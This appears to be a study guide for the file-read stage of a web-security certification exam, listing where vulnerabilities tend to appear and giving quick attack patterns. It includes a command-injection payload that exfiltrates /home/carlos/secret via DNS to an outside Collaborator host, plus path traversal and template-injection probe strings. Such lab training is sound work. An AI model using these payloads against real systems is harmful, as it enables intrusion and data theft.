# Stage 3: File System Access

## Overview
Stage 3 focuses on reading `/home/carlos/secret` from the file system. This is the final stage to complete the exam.

## Common Vulnerability Locations

### 📁 File Upload
- Web shell upload
- Path traversal in filename
- Extension blacklist bypass

### 📧 Feedback Forms
- OS command injection in email field
- SSTI in message field

### 📦 Product Stock Check
- XXE injection in XML
- SSRF via XML external entities

### 🖼️ Image Display
- Path traversal in filename parameter
- SSRF via image URL

### 🔍 Product Details
- SSTI in "out of stock" message
- Template injection in dynamic content

## Vulnerability Checklist

- [ ] OS command injection in feedback forms
- [ ] Path traversal in image parameters
- [ ] SSTI in product details
- [ ] XXE in stock check XML
- [ ] SSRF in admin panel features
- [ ] File upload with web shell
- [ ] Insecure deserialization in cookies

## Key Tools

- **Burp Collaborator** - For out-of-band data exfiltration
- **Burp Scanner** - Detects most vulnerabilities
- **Hackvertor** - For XXE encoding

## Quick Tips

1. **OS Command Injection** - Use DNS exfiltration: `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Path Traversal** - URL-encode entire payload if WAF blocks
3. **SSTI** - Test template expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
4. **XXE** - Scan stock check requests
5. **SSRF** - Check admin panel "Download report" features

## Common Patterns

### Pattern 1: Command Injection → File Read
```
Feedback form → nslookup $(cat /home/carlos/secret).burp.oastify.com
```

### Pattern 2: Path Traversal → Direct Read
```
/image?filename=../../../../home/carlos/secret
```

### Pattern 3: SSTI → RCE → File Read
```
{{7*7}} → Identify template engine → RCE payload → Read file
```

### Pattern 4: XXE → File Read
```
Stock check XML → XXE payload → Read /home/carlos/secret
```

---

See individual vulnerability files for detailed payloads and techniques.
